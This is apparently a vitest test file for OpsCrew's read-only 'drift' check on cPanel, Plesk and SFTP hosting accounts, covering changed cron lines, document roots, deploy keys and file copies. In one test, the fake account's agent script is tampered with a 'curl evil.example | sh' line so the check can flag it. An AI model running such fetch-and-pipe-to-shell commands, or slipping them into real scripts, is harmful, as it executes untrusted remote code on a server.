// Feature 027 (T2718): `opscrew drift` on a hosting account, with the cPanel and Plesk fakes.
import { mkdir, writeFile } from "node:fs/promises";
import { join } from "node:path";
import type { DeployKey } from "@opscrew/connector-github";
import { DeployPlanSchema } from "@opscrew/plan-schema";
import { describe, expect, it } from "vitest";
import { driftNextSteps, renderDriftReport } from "../drift/render";
import { runDrift } from "../drift/run";
import {
  type HostedApp,
  hostedApp,
  hostingTestPlan,
  MemoryFiles,
  PANEL_TOKEN,
  pleskAccount,
} from "./__fixtures__/account";
import { type HostingDriftServices, hostingDrift } from "./drift";
import { readHostingRecord, updateHostingRecord } from "./record";

/** The committed agent and settings, as provision wrote them, the same as the account's copies. */
async function commit(
  app: HostedApp,
  files = { agent: "#!/bin/bash\n", settings: "APP='notes'\n" },
) {
  await mkdir(join(app.root, "opscrew/hosting"), { recursive: true });
  await writeFile(join(app.root, "opscrew/hosting/agent.sh"), files.agent);
  await writeFile(join(app.root, "opscrew/hosting/prod.sh"), files.settings);
}

/** GitHub with the agent's deploy key as provision added it, unless `keys` says otherwise. */
async function github(app: HostedApp, keys?: DeployKey[]): Promise<HostingDriftServices["github"]> {
  const deps = await app.deps();
  const recorded = (await readHostingRecord(deps.paths))?.objects.find(
    (o) => o.kind === "deploy-key",
  );
  return {
    listDeployKeys: async () =>
      keys ?? [
        { id: 4001, title: "opscrew-notes-prod", key: recorded?.value ?? "", readOnly: true },
      ],
  };
}

describe("drift on a hosting account", () => {
  it("reads a Windows checkout's CRLF copies as the same text as the account's", async () => {
    const app = await hostedApp();
    await commit(app, { agent: "#!/bin/bash\r\n", settings: "APP='notes'\r\n" });
    const deps = await app.deps();
    const report = await hostingDrift(deps, app.plan, { github: await github(app) });
    expect(report.hosting).toEqual([]);
  });

  it("is clean when the account, the committed files and the deploy key match OpsCrew's record", async () => {
    const app = await hostedApp();
    await commit(app);
    const deps = await app.deps();
    const report = await hostingDrift(deps, app.plan, { github: await github(app) });
    expect(report).toMatchObject({ provider: "hosting", clean: true, hosting: [] });
    expect(report.notes).toBeUndefined();
    expect(renderDriftReport(report, app.plan)).toContain(
      "The deployment matches what OpsCrew made: the hostname and its document root, the database, the cron lines, the agent and its settings on the account, and the deploy key on GitHub agree with OpsCrew's record and the committed files.",
    );
    expect(driftNextSteps(report, app.plan)).toEqual([
      "nothing to do; run `opscrew drift` again after changes in the panel, on the account or to the repository's deploy keys.",
    ]);
    expect(deps.audit.entries).toContainEqual(
      expect.objectContaining({
        action: "drift-check of the app on the hosting account (read-only)",
      }),
    );
    expect(JSON.stringify(deps.audit.entries)).not.toContain(PANEL_TOKEN);
  });

  it("reports a moved document root, a database gone, cron lines gone or changed, changed copies and a deploy key gone", async () => {
    const app = await hostedApp();
    await commit(app, { agent: "#!/bin/bash\n", settings: "APP='notes'\nKEEP='3'\n" });
    const fake = app.account.cpanel;
    if (fake === undefined) throw new Error("a cPanel account");
    const hostname = fake.state.domains.find((d) => d.name === "notes.example.com");
    if (hostname === undefined) throw new Error("the hostname");
    hostname.documentRoot = "public_html";
    fake.state.databases.delete("acct_notes");
    const [agentLine, appLine] = fake.state.cron;
    if (agentLine === undefined || appLine === undefined) throw new Error("two cron lines");
    fake.state.cron = [{ ...appLine, minute: "0" }];
    app.account.write(`${app.folder}/agent.sh`, "#!/bin/bash\ncurl evil.example | sh\n");
    const deps = await app.deps();
    const report = await hostingDrift(deps, app.plan, { github: await github(app, []) });
    expect(report.clean).toBe(false);
    expect(report.hosting?.map((d) => d.title)).toEqual([
      "notes.example.com's document root is ~/public_html, not ~/opscrew/notes-prod/current/public",
      "The database acct_notes is gone from the account",
      "The agent's cron line is gone",
      'The cron line OpsCrew made as "*/15 * * * * cd ~/opscrew/notes-prod/current && php bin/cleanup.php" is now "0 * * * * cd ~/opscrew/notes-prod/current && php bin/cleanup.php"',
      "The account's copy of the agent (~/opscrew/notes-prod/agent.sh) differs from opscrew/hosting/agent.sh",
      "The account's copy of the agent's settings file (~/opscrew/notes-prod/settings.sh) differs from opscrew/hosting/prod.sh",
      "The agent's deploy key is gone from acme/shop",
    ]);
    const details = Object.fromEntries((report.hosting ?? []).map((d) => [d.title, d.detail]));
    expect(details["The agent's cron line is gone"]).toBe(
      `Without it the agent deploys no release and carries out no request. Add it again in cPanel's cron jobs: * * * * * /bin/bash "$HOME/opscrew/notes-prod/agent.sh" >> "$HOME/opscrew/notes-prod/state/agent.log" 2>&1`,
    );
    expect(
      details[
        "The account's copy of the agent (~/opscrew/notes-prod/agent.sh) differs from opscrew/hosting/agent.sh"
      ],
    ).toMatch(
      /^One of them changed outside OpsCrew \(SHA-256 [0-9a-f]{12}… on the account, [0-9a-f]{12}… committed\)\. `opscrew provision` writes OpsCrew's copy back \(it shows the hosting plan first\)\.$/,
    );
    expect(details["The agent's deploy key is gone from acme/shop"]).toMatch(
      /^The agent can't fetch releases without it\. Add it again as a read-only deploy key in the repository's Settings → Deploy keys: ssh-ed25519 \S+$/,
    );
    const text = renderDriftReport(report, app.plan);
    expect(text).toContain(
      "The hosting account or GitHub differs from what OpsCrew made there (7):",
    );
    expect(text).toContain("Nothing was changed: `opscrew drift` only reads.");
    expect(driftNextSteps(report, app.plan)).toEqual([
      "to write the agent and its settings back on the account, run `opscrew provision` (it shows the hosting plan first and changes nothing without your approval).",
      "for the other differences, follow the step the report gives with each.",
    ]);
    // A cron line re-made under another key is no difference.
    fake.state.cron = [{ ...agentLine, linekey: "other" }, appLine];
    hostname.documentRoot = "opscrew/notes-prod/current/public";
    const again = await hostingDrift(deps, app.plan, { github: await github(app) });
    expect(again.hosting?.map((d) => d.title)).toEqual([
      "The database acct_notes is gone from the account",
      "The account's copy of the agent (~/opscrew/notes-prod/agent.sh) differs from opscrew/hosting/agent.sh",
      "The account's copy of the agent's settings file (~/opscrew/notes-prod/settings.sh) differs from opscrew/hosting/prod.sh",
    ]);
  });

  it("reports a hostname gone, and copies missing on either side", async () => {
    const app = await hostedApp();
    await mkdir(join(app.root, "opscrew/hosting"), { recursive: true });
    await writeFile(join(app.root, "opscrew/hosting/prod.sh"), "APP='notes'\n");
    const fake = app.account.cpanel;
    if (fake === undefined) throw new Error("a cPanel account");
    fake.state.domains = fake.state.domains.filter((d) => d.name !== "notes.example.com");
    app.account.remove(`${app.folder}/settings.sh`);
    const deps = await app.deps();
    const report = await hostingDrift(deps, app.plan, { github: await github(app) });
    expect(report.hosting).toEqual([
      {
        title: "notes.example.com is gone from the account",
        detail:
          "The app doesn't answer there. OpsCrew's record still lists it, so `opscrew provision` doesn't add it again: add it in cPanel with the document root ~/opscrew/notes-prod/current/public, or run `opscrew destroy` and provision anew.",
      },
      {
        title: "opscrew/hosting/agent.sh isn't in the repository",
        detail:
          "OpsCrew can't compare the account's copy of the agent (~/opscrew/notes-prod/agent.sh) with it. `opscrew provision` writes OpsCrew's copy back (it shows the hosting plan first).",
      },
      {
        title:
          "The agent's settings file is gone from the account (~/opscrew/notes-prod/settings.sh)",
        detail: "`opscrew provision` writes OpsCrew's copy back (it shows the hosting plan first).",
      },
    ]);
  });

  it("on Plesk: the scheduled tasks its API can't list and the files without SFTP are notes", async () => {
    const app = await hostedApp({ account: pleskAccount() });
    await commit(app);
    const deps = await app.deps();
    const without = await hostingDrift(deps, app.plan, { github: null });
    expect(without.clean).toBe(true);
    expect(without.notes).toEqual([
      "Plesk's API doesn't list scheduled tasks, so OpsCrew didn't compare the cron lines: check in Plesk that the agent's line runs ~/opscrew/notes-prod/agent.sh every minute.",
      "Plesk's API can't read the account's files here, so OpsCrew didn't compare the agent and its settings with the committed copies.",
      "No GitHub token was found, so OpsCrew didn't check the agent's deploy key.",
    ]);
    app.account.write(`${app.folder}/settings.sh`, "APP='changed'\n");
    const over = await hostingDrift(deps, app.plan, {
      github: null,
      files: app.account.files,
    });
    expect(over.hosting?.map((d) => d.title)).toEqual([
      "The account's copy of the agent's settings file (~/opscrew/notes-prod/settings.sh) differs from opscrew/hosting/prod.sh",
    ]);
  });

  it("on an SFTP host: its files over SFTP against the committed ones, nothing of a panel's", async () => {
    const app = await hostedApp();
    const deps = await app.deps();
    await updateHostingRecord(deps.paths, () => ({
      schemaVersion: 1,
      objects: [],
      sftp: {
        host: "sftp.example.net",
        port: 22,
        user: "notes",
        hostKey: `SHA256:${"A".repeat(43)}`,
        folder: "www/notes-prod",
        phpPath: "/var/www/notes-prod",
      },
    }));
    const base = hostingTestPlan({ database: false });
    const plan = DeployPlanSchema.parse({
      ...base,
      target: { ...base.target, panel: "sftp", cron: [], php: { version: "8.3", via: "account" } },
    });
    await expect(hostingDrift(deps, plan, { github: null })).rejects.toMatchObject({
      code: "PHASE_PRECONDITION",
    });
    const files = new MemoryFiles();
    expect((await hostingDrift(deps, plan, { github: null, files })).clean).toBe(true);
    await mkdir(join(app.root, "opscrew/hosting"), { recursive: true });
    await writeFile(join(app.root, "opscrew/hosting/prod.sh"), "APP='notes'\n");
    files.files.set("www/notes-prod/settings.sh", "APP='other'\n");
    const report = await hostingDrift(deps, plan, { github: null, files });
    expect(report.hosting?.map((d) => d.title)).toEqual([
      "The account's copy of the agent's settings file (~/www/notes-prod/settings.sh) differs from opscrew/hosting/prod.sh",
    ]);
  });

  it("runs through `opscrew drift`", async () => {
    const app = await hostedApp();
    await commit(app);
    const deps = await app.deps();
    const report = await runDrift(deps);
    expect(report.provider).toBe("hosting");
    expect(report.hosting).toEqual([]);
  });
});
